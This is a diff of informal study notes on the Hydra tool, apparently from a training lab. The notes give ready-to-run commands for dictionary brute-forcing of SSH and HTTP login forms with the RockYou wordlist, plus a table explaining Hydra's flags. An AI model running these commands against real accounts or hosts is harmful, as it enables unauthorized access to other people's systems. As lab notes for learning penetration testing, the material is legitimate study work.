@@ -1,6 +1,6 @@
 sudo hydra -l "BTHub*****" -P Rockyou.txt (host pcs ip) ssh(Service type)
 
-RockYou.txt : list of lots of passwords it may be
+RockYou.txt : list of lots of passwords it may be  (/usr/share/wordlists/rockyou.txt on kali linux)
 
 F=incorrect		what word hydra uses to know if the attempt was sucsessful (e.g "incorrect")
 
@@ -15,3 +15,18 @@ hydra -l <username> -P <wordlist> 10.10.71.217 http-post-form "/login:username=^
 brute force a SSH password:
 
  hydra -l <Username> -P /usr/share/wordlists/rockyou.txt <IP ADDR> ssh
+
+
+SECTION             FUNCTION
+
+-t 4                    Number of parallel connections per target
+
+-l [user]               Points to the user who's account you're trying to compromise
+
+-P [path to dictionary] Points to the file containing the list of possible passwords  /usr/share/wordlists/rockyou.txt
+
+-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
+
+[machine IP]            The IP address of the target machine
+
+ftp / protocol          Sets the protocol
